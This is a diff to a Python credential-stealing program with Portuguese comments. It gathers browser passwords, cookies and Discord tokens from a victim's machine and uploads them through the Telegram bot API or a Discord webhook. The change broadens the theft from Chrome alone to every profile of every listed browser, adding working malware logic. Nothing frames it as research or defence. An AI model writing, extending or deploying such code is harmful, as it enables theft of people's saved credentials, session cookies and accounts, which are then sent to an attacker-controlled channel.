@@ -36,11 +36,13 @@ fileCookies = "cookies_" + os.getlogin() + ".txt"
 filePass = "senhas_" + os.getlogin() + ".txt"
 fileInfo = "info_" + os.getlogin() + ".txt"
 
-# ------------------- Perfis do Chrome -------------------
+# ------------------- Perfis dos Navegadores -------------------
 
-for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
-    if i.startswith("Profile "):
-        browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"
+for browser, path in list(browser_loc.items()):
+    if os.path.exists(path + "\\User Data"):
+        for profile in os.listdir(path + "\\User Data"):
+            if profile.startswith("Profile") or profile == "Default":
+                browser_loc[f"{browser}_{profile}"] = f"{path}\\User Data\\{profile}"
 
 # ------------------- Tokens do Discord -------------------
 
@@ -180,19 +182,13 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
 
 # ------------------- Funções Auxiliares de Caminho -------------------
 def Local_State(path):
-    return f"{path}\\User Data\\Local State"
+    return f"{path}\\Local State"
 
 def Login_Data(path):
-    if "Profile" in path:
-        return f"{path}\\Login Data"
-    else:
-        return f"{path}\\User Data\\Default\\Login Data"
+    return f"{path}\\Login Data"
 
 def Cookies(path):
-    if "Profile" in path:
-        return f"{path}\\Network\\Cookies"
-    else:
-        return f"{path}\\User Data\\Default\\Network\\Cookies"
+    return f"{path}\\Network\\Cookies"
 
 # ------------------- Manipulação de Tokens -------------------
 def main_tokens():
@@ -220,7 +216,7 @@ def decrypt_files(path, browser):
 def post_to(file):
     token = "TOKEN DO TELEGRAM"
     chat_id = "ID DO CHAT DO TELEGRAM"
-    webhook_url = "URL WEBHOOK"
+    webhook_url = "URL WEBHOOK DISCORD"
     
     if token != "TOKEN DO TELEGRAM" and chat_id != "ID DO CHAT DO TELEGRAM":
         post("https://api.telegram.org/bot" + token + "/sendDocument", data={'chat_id': chat_id},
